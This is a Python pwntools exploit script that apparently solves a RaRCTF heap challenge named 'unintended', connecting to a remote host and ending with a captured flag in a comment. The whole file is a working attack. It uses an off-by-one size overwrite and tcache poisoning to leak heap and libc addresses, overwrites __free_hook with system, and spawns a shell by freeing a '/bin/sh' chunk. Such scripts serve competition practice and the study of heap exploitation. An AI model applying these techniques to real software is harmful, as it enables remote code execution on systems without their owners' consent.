from pwn import *

p = remote('193.57.159.27','59314')
#p = process('./unintended')
elf = ELF('./unintended')
libc = ELF('./lib/libc.so.6')

def Make(idx,size,con):
    p.sendlineafter('> ',str(1))
    p.sendlineafter('Challenge number: ',str(idx))
    p.sendafter('Challenge category: ','web')
    p.sendafter('Challenge name: ','A'*0x10)
    p.sendlineafter('Challenge description length: ',str(size))
    p.sendafter('Challenge description: ',con)
    p.sendlineafter('Points: ',str(0x123))

def Patch(idx,con):
    p.sendlineafter('> ',str(2))
    p.sendlineafter('Challenge number: ',str(idx))
    p.sendafter('New challenge description: ',con)

def Deploy(idx):
    p.sendlineafter('> ',str(3))
    p.sendlineafter('Challenge number: ',str(idx))

def Free(idx):
    p.sendlineafter('> ',str(4))
    p.sendlineafter('Challenge number: ',str(idx))


Make(0,0x428,'A'*0x10)
Make(1,0x18,'A'*0x18)
Make(2,0x18,'A'*0x18)
Make(3,0x18,'A'*0x18)
Make(4,0x18,'A'*0x18)
Free(0)
Patch(1,'A'*0x18+'\xf1')
Free(4)
Free(2)
Make(0,0xe8,'C'*0x8)

#context.log_level = 'debug'
Deploy(0)
p.recvuntil('Name: ')
p.recvuntil('A'*0x10)
heap = u64(p.recv(6)+'\x00\x00')-0x730
p.info('heap_base: '+hex(heap))
Free(0)
payload = 'A'*0x58+p64(0x41)+'A'*0x20+p64(heap+0x2a0)
Make(0,0xe8,payload)
Deploy(3)
p.recvuntil('Description: ')
libc_base = u64(p.recv(6)+'\x00\x00')-0x3ebca0
p.info('libc_base: '+hex(libc_base))

Free(0)
payload = 'A'*0x38+p64(0x21)+p64(libc_base+libc.sym['__free_hook'])
Make(0,0xe8,payload)

Make(4,0x18,'/bin/sh')
Make(5,0x18,p64(libc_base+libc.sym['system']))
Free(4)

#gdb.attach(p)
p.interactive()
#rarctf{y0u_b3tt3r_h4v3_us3d_th3_int3nd3d...89406fae76}



